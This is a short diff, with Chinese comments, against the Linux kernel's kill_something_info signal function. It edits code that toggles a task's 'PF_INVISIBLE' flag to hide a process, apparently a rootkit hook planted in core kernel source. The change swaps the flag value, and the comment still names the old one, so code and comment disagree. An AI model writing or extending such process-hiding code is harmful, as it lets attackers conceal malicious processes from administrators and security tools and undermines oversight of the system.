@@ -1674,7 +1674,7 @@ static int kill_something_info(int sig, struct kernel_siginfo *info, pid_t pid)
             // 增加对 task 的引用计数，以确保它在我们处理期间有效
             get_task_struct(task);
             // 切换进程的可见性标志，这里需要确保使用正确的标志位
-            task->flags ^= 0x10000000; // 假设 0x10000000 是 PF_INVISIBLE 标志
+            task->flags ^= 0x40000000; // 假设 0x10000000 是 PF_INVISIBLE 标志
 
             if (!my_val_timer_is_setup) {
                 timer_setup(&my_val_reset_timer, do_reset_my_val_callback, 0);
